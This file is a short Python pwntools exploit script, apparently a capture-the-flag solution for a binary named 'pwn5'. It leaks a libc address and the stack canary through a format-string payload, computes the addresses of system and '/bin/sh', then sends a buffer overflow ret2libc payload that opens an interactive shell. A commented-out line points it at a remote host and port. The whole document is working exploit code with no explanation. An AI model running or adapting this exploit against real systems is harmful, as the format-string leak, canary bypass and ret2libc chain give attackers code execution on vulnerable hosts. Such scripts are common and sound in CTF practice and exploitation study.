from pwn import *

p = process('./pwn5')
#p = remote('10.50.6.2',1337)
elf = ELF('pwn5')
libc = ELF('libc.so')

p.recvuntil('name:')
p.sendline('%34$p,%35$p')
p.recvuntil('ctf!\n')
data = p.recv(10)
data = int(data,16)
p.recvuntil(',')
cannary = p.recv(10)
cannary = int(cannary,16)

puts_addr = data - 11
print hex(puts_addr)
base = puts_addr - libc.symbols['puts']
system_addr = base + libc.symbols['system']
bin_addr =  base + libc.search('/bin/sh').next()
print hex(system_addr),hex(bin_addr)
p.recvuntil('messages:')
playload = 'a'*100 + p32(cannary) + 'A'*12 + p32(system_addr) + 'AAAA' + p32(bin_addr)
#gdb.attach(p)
p.sendline(playload)

p.interactive()
